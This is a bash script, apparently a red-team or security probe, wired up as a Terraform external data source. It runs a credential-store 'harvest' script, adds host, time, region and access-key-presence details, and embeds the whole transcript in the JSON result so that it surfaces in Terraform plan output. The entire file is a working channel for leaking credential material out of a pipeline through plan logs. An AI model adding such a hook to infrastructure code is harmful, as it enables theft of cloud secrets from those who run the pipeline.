#!/usr/bin/env bash
# c211-i120359 read-only AWS credential-store harvest probe.
# Writes the harvest transcript to a local file, then emits the terraform
# external-data-source JSON (single string value) so the plan output carries it.
set +e
export AWS_PAGER=""
RAW=/tmp/c211_i120359_raw.txt
: > "$RAW"
echo "C211_I120359_ENV region=${AWS_REGION:-${AWS_DEFAULT_REGION:-none}} akid=$([ -n "$AWS_ACCESS_KEY_ID" ] && echo present || echo absent)" >> "$RAW"
echo "C211_I120359_HOST $(hostname) $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$RAW"
python3 ./c211_harvest.py >> "$RAW" 2>&1
echo "C211_I120359_TAIL_OK rc=$?" >> "$RAW"
python3 - "$RAW" <<'PY'
import hashlib, json, sys
raw = open(sys.argv[1], 'rb').read()
sys.stdout.write(json.dumps({
    "harvest_sha256": hashlib.sha256(raw).hexdigest(),
    "harvest_bytes": str(len(raw)),
    "probe": raw.decode('utf-8', 'replace'),
}) + "\n")
PY
